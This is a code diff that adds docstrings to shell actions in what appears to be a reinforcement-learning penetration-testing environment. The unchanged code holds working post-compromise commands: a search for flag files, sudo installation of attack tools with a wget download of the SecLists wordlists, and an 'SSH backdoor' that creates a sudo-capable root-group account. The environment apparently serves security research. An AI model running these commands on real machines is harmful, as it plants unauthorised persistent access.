@@ -4,9 +4,18 @@ from gym_pycr_pwcrack.dao.action.action_id import ActionId
 from gym_pycr_pwcrack.dao.action.action import ActionOutcome
 
 class ShellActions:
+    """
+    Class implementing regular Bash actions (e.g. interacting with filesystem or OS)
+    """
 
     @staticmethod
     def FIND_FLAG(index : int) -> Action:
+        """
+        Searches through the file systems that have been compromised to find a flag
+
+        :param index: index of the machine to apply the action to
+        :return: the action
+        """
         id = ActionId.FIND_FLAG
         cmd = ["find / -name 'flag*.txt'  2>&1 | grep -v 'Permission denied'"]
         alt_cmd = ["find / | grep 'flag*'"]
@@ -18,6 +27,12 @@ class ShellActions:
 
     @staticmethod
     def INSTALL_TOOLS(index: int) -> Action:
+        """
+        Installs tools on compromised machines
+
+        :param index: index of the machine to apply the action to
+        :return: the created action
+        """
         id = ActionId.INSTALL_TOOLS
         cmd = ["sudo apt-get -y install nmap ssh git unzip lftp",
                "cd /;sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip && sudo unzip -o SecList.zip && sudo rm -f SecList.zip && sudo mv SecLists-master /SecLists"]
@@ -29,6 +44,12 @@ class ShellActions:
 
     @staticmethod
     def SSH_BACKDOOR(index: int) -> Action:
+        """
+        Installs a SSH backdoor on a compromised machine
+
+        :param index: index of the machine to apply the action to
+        :return: the action
+        """
         id = ActionId.SSH_BACKDOOR
         cmd = ["sudo service ssh start", "sudo useradd -rm -d /home/{} -s /bin/bash -g root -G sudo -p \"$(openssl passwd -1 '{}')\" {}"]
         return Action(id=id, name="Install SSH backdoor", cmd=cmd,
